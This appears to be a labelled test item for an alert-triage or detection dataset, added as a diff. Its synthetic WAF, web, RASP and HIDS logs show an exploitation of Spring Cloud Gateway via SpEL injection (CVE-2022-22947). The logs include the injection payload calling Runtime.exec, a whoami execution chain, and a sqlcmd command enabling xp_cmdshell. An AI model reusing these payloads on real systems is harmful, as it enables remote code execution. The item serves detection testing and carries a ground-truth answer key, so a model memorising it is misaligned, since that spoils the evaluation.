@@ -1,0 +1,57 @@
+{
+ "unit": 1065,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Spring Cloud Gateway SpEL 注入 RCE (CVE-2022-22947)",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-30 09:48:56",
+   "source": "waf",
+   "log_id": "WAF0403549",
+   "content": "/actuator/gateway/routes/x1 {\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\"} Mozilla/5.0 (Macintosh",
+   "event_id": "1065-WAF0403549"
+  },
+  {
+   "timestamp": "2026-06-30 09:48:57",
+   "source": "web",
+   "log_id": "WEB0406174",
+   "content": "/actuator/gateway/routes/x1 {\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\"} Mozilla/5.0 (Macintosh",
+   "event_id": "1065-WEB0406174"
+  },
+  {
+   "timestamp": "2026-06-30 09:48:59",
+   "source": "rasp",
+   "log_id": "RASP0446491",
+   "content": "https://app-spring-23.ops-corp.com/actuator/gateway/routes/x1 {\"spel\": \"T(java.lang.Runtime).getRuntime().exec",
+   "event_id": "1065-RASP0446491"
+  },
+  {
+   "timestamp": "2026-06-30 09:50:25",
+   "source": "hids",
+   "log_id": "HID0437329",
+   "content": "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\\app\\gateway.jar",
+   "event_id": "1065-HID0437329"
+  },
+  {
+   "timestamp": "2026-06-30 09:52:01",
+   "source": "hids",
+   "log_id": "HID0437338",
+   "content": "sqlcmd -S 10.20.4.31 -Q \"EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE\" sqlcmd sqlcmd -S 10.20.4.31 <== /usr/s",
+   "event_id": "1065-HID0437338"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
